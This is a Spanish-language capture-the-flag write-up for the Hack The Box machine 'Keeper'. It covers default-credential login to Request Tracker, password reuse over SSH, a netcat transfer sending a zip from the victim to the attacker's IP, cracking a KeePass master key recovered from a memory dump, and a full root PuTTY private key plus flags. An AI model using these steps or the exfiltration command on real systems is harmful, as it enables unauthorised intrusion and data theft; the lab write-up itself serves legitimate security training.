---
tags:
title: Keeper - Easy (HTB)
permalink: /Keeper-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.129.229.41                                        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 01:52 -03
Nmap scan report for 10.129.229.41
Host is up (0.55s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.38 seconds
```

## Website /  Port 80

El sitio principal nos marca un mensaje el cual nos indica que visitemos la siguiente url `http://tickets.keeper.htb`.

![image-center](/assets/images/{1A0B15E5-4D52-4C2F-AC1C-34C1ED2A0BBB}.png)

## tickets.keeper.htb

![image-center](/assets/images/{1712BF0A-92B5-4F3D-915E-02F35FD646A3}.png)

## Shell as lnorgaard

Podria probar por SQL Inyections para bypassear el panel de login, pero no me funcionan.

![image-center](/assets/images/{6BA57A3E-2166-458B-B1A8-D71CD41CCF2D}.png)

Buscando en internet por las credenciales por defecto de `Request Tracker`, me encuentro que las credenciales son `root:password`, y probandolas para intento de login en la pagina, veo que son validas.

![image-center](/assets/images/{6A878BD2-E160-4DFF-9032-57358525C7DA}.png)

Dentro del apartado **`Adminstrador -> Usuarios -> Elegir`** veo un usuario llamado `lnorgaard` con una descripcion con lo que parece ser una password **(`Welcome2023!`)**.

![image-center](/assets/images/{23966230-97F9-408D-A3B9-A3E3846DCCAD}.png)

La misma probandola por login via `ssh` veo que son validas.

```bash
ssh lnorgaard@keeper.htb
lnorgaard@keeper.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have mail.
Last login: Tue Aug  8 11:31:22 2023 from 10.10.14.23
lnorgaard@keeper:~$
```

```bash
lnorgaard@keeper:~$ cat user.txt 
7ad6b20ea8c13a9ec29e24f0428b1f85
```

## Shell as root

### Enumeration

Dentro del directorio personal de este usuario hay un comprimido `zip`, asi que me lo baje a mi maquina para analizarlo.

```bash
lnorgaard@keeper:~$ ls
RT30000.zip  user.txt
```

Para transferirlo uso el propio `nc` de la maquina haciendo que se conecte a mi `ip` por el puerto `4444` enviando asi el archivo `zip`.

Desde la maquina victima:

```bash
nc 10.10.17.19 4444 < RT30000.zip
```

Y desde mi maquina recibo la conexion junto con el contenido del archivo.

```bash
nc -nvlp 4444 > rt30000.zip    
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.41] 47858
```

### Analizing file

Analizando que tipo de comprimido es, parece ser un `zip` comun.

```bash
file rt30000.zip                                                                   
rt30000.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Con la herramienta `7z` lo descomprimo.

```bash
 7z x rt30000.zip           

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 87391651 bytes (84 MiB)

Extracting archive: rt30000.zip
--
Path = rt30000.zip
Type = zip
Physical Size = 87391651

Everything is Ok          

Files: 2
Size:       253398818
Compressed: 87391651
```

El mismo archivo me dejo con dos archivos de bases de datos de `Keepass` por lo que parece por la extension de los archivos.

```bash
ls
allPorts  KeePassDumpFull.dmp  passcodes.kdbx 
```

Intentando ver el contenido del `.dmp` y ademas el `.kdbx`  de los cuales los dos me piden una clave maestra.

![image-center](/assets/images/{8534932A-33DB-47EB-8F88-F4ADFE674110}.png)

### Extracting posibbles passwords 

Como me pide una pass, puedo jugar con `keepass2john` para convertir el arhcivo a un hash el cual pueda romper pero de momento eso no funciona, y como tengo un `.kdbx` puedo jugar con la herramienta **[keepass-dump-extractor](https://github.com/JorianWoltjer/keepass-dump-extractor)** para poder extraer del dumpeado de memoria de keepass posibles claves maestras.

Sigo tal cual los pasos de la herramienta para poder crear un diccionario de posibles masterkeys de keepass para poder desbloquear el archivo.

```bash
./keepass-dump-extractor KeePassDumpFull.dmp -f all > wordlist.txt
```

La wordlist en aspectos generales tiene las siguientes posibles claves.

```bash
cat wordlist.txt                             
 ødgrød med fløde
 ]dgrød med fløde
 §dgrød med fløde
 Ȁdgrød med fløde
 Ḁdgrød med fløde
!ødgrød med fløde
!]dgrød med fløde
!§dgrød med fløde
!Ȁdgrød med fløde
!Ḁdgrød med fløde
"ødgrød med fløde
[..snip..]
```

Ahora el archivo de **`keepass`** lo convierto a un hash

```bash
keepass2john passcodes.kdbx > passwords.kdbx.hash
```

### PuTTY key for root.

Y con `hashcat` trato de romper el hash que cree.

```bash
hashcat -m 13400 --username passwords.kdbx.hash wordlist.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-skylake-avx512-AMD Ryzen 5 8645HS w/ Radeon 760M Graphics, 1456/2912 MB (512 MB allocatable), 4MCU

[..snip..]

$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc:rødgrød med fløde
                                                          

Stopped: Wed Nov 19 03:16:28 2025
```

Como me descubrio la clave `rødgrød med fløde` puedo ahora si pasar a desbloquear y analizar el contenido del archivo **`keepass`**.

Viendo el contenido de `passcodes.kdbx`. veo que para el usuario root hay una clave guardada.

```bash
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```

El contenido del mismo como ahí lo indica parece ser una `clave RSA de SSH` en formato **`PuTTY`** que se genero para `root`, por lo ahora puedo usar la misma herramienta con la que se creo para poder forjar mi propia clave `id_rsa` para `root` y así poder conectarme a la maquina usando la misma como clave de identidad.

Para eso uso `puttygen`, donde meto el contenido que descubrí dentro de un archivo con la extensión **`.ppk`** el cual es el formato estándar de `OpenSSH`. Por lo que con la misma tool le paso el `.ppk` y con eso genero el archivo **`id_rsa`** para root, indicándole con el parámetro `-O` el tipo de archivo que quiero generar.

```bash
puttygen root_key.ppk -O private-openssh -o id_rsa
```

Y ahora ya puedo conectarme con la misma atraves de `ssh`, para poder ver la flag.

```bash
ssh root@keeper.htb -i id_rsa
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~#
```

```bash
root@keeper:~# cat root.txt 
d902569046574451855a488a4a16d958
```

`~Happy Hacking.`